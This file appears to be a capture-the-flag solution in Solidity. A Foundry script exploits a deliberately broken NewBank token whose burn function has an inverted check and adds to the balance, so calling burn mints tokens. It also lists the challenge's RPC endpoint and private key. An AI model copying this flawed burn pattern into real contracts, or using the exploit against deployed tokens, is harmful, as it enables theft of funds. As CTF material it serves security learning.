// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x51f53Cf92f96d9C37f720092398b8488796860aa);
    address wallet = 0xE4B2DF7cBAd3bCC418234914Fc8cB39A9988239c;
    NewBank public target = setup.NB();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x440dcc4e26d4bd175ea5378ed48e4332dc11d37ac65ef5f36faad7b2d4977557);

        setup.setPlayer();
        target.burn(wallet, 10 ether + 1);
        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// UUID	fdbfe53d-24d5-4805-b3a3-0c9774269a8e
// RPC Endpoint	http://103.178.153.113:40011/fdbfe53d-24d5-4805-b3a3-0c9774269a8e
// Private Key	0x440dcc4e26d4bd175ea5378ed48e4332dc11d37ac65ef5f36faad7b2d4977557
// Setup Contract	0x51f53Cf92f96d9C37f720092398b8488796860aa
// Wallet	0xE4B2DF7cBAd3bCC418234914Fc8cB39A9988239c

contract Setup{
    NewBank public NB;
    address public player;

    constructor(uint256 _initialSupply) {
        NB = new NewBank(_initialSupply);
    }

    function setPlayer() public{
        require(msg.sender == tx.origin, "Only Human are allowed to be Player");
        player = msg.sender;
    }

    function isSolved() public view returns(bool){
        return NB.balanceOf(player) > 10 ether;
    }
}

interface IBetterERC20 {
    function transfer(address _to, uint256 _value) external returns (bool);

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool);

    function approve(address _spender, uint256 _value) external returns (bool);

    function mint(uint256 _value) external;

    function burn(address _who, uint256 _value) external;

    function owner() external view returns (address);

    function balanceOf(address _who) external view returns (uint256);

    function allowance(
        address _owner,
        address _spender
    ) external view returns (uint256);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract NewBank is IBetterERC20 {
    address public override owner;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    string public override name = "NewBank Token";
    string public override symbol = "NBT";
    uint8 public override decimals = 18;

    constructor(uint256 _initialSupply) {
        owner = msg.sender;
        balanceOf[msg.sender] = _initialSupply;
    }

    function transfer(address _to, uint256 _value) external override returns (bool) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) external override returns (bool) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        return true;
    }

    function approve(address _spender, uint256 _value) external override returns (bool) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    function mint(uint256 _value) external override {
        require(msg.sender == owner, "Only Owner are allowed to mint!");
        balanceOf[msg.sender] += _value;
    }

    function burn(address _who, uint256 _value) external override {
        require(balanceOf[_who] <= _value, "Insufficient balance to burn");
        balanceOf[_who] += _value;
    }
    
}

